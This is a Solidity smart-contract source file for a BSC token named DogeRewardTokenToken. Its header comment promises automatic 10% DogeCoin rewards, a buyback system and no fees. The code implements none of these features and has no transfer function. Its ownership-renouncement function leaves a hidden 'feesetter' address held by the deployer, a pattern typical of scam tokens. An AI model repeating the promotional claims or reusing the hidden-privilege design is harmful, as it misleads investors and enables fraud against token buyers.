/**
 *Submitted for verification at BscScan.com on 2021-07-22
*/

/**
Join us 
Telegram : https://t.me/DogeRewardToken 
Website : www.DogeReward.net

❗️ ❗️ $DogeRewardToken ❗️ ❗️

We have in mind to put at first place the confidence that our token and our launch is Legit.

Enjoy First BSC token with dual functionality : Buyback system AND DogeCoin reward

➡️10% to DogeRewardToken ($DRT) holders in DogeCoin (minimum hold to earn 250,000 Tokens)
➡️0% to Marketing Wallet
➡️0% Dev Wallet

🔥 Be Automatically paid in DogeCoin, Directly sent to your wallet every 60 minutes.
Just add DogeCoin 💎 (0xba2ae424d960c26247dd6c32edc70b295c744c43) to your wallet.


https://t.me/DogeRewardTokenToken
https://t.me/DogeRewardTokenToken
https://t.me/DogeRewardTokenToken
https://t.me/DogeRewardTokenToken

/*
    

*/
pragma solidity ^0.4.26;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
}
contract DogeShill is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
	symbol = "DRT";
    name = "DogeRewardTokenToken";
    decimals = 2;
        totalSupply = 10000000000000000;
	balances[msg.sender] = totalSupply;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));

    }
}